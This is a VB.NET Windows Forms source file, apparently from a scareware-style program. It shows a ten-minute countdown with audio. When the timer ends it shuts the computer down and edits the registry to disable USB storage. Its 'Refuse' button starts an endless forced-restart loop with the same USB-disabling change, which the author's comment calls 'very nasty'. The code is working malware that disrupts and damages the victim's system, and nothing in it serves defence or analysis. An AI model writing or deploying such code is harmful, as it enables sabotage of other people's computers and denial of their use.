Imports Microsoft.Win32

Public Class Form2
    Private TargetDT As DateTime
    Private CountDownFrom As TimeSpan = TimeSpan.FromMinutes(10) '10 minute countdown

    Private Sub Form2_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        My.Computer.Audio.Play(My.Resources.fred, AudioPlayMode.Background)
        Timer1.Interval = 100
        TargetDT = DateTime.Now.Add(CountDownFrom)
        Timer1.Start()
    End Sub


    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim ts As TimeSpan = TargetDT.Subtract(DateTime.Now) 'Start of Timer1 Code>>>>
        If ts.TotalMilliseconds > 0 Then
            Label1.Text = ts.ToString("mm\:ss")
        Else
            Label1.Text = "00:00"
            Timer1.Stop() ' End of Timer1 Code>>>
            Shell("shutdown -s -t 950") 'This sets timer for 10 minutes NOTE: It takes 10 seconds for program to shutdown, so I set shutdown imer for 9:50///
            Dim regKey As RegistryKey
            regKey = Registry.LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services\USBSTOR", True)
            regKey.SetValue("Start", 4)

        End If
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click  'Continue Button///
        Choice.Show()
        Me.Hide()
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click  'Refuse Button///This makes computer loop -RESTART-...very nasty 
        Do
            Shell("shutdown -r")
            Dim regKey As RegistryKey
            regKey = Registry.LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services\USBSTOR", True)
            regKey.SetValue("Start", 4)
        Loop
    End Sub
End Class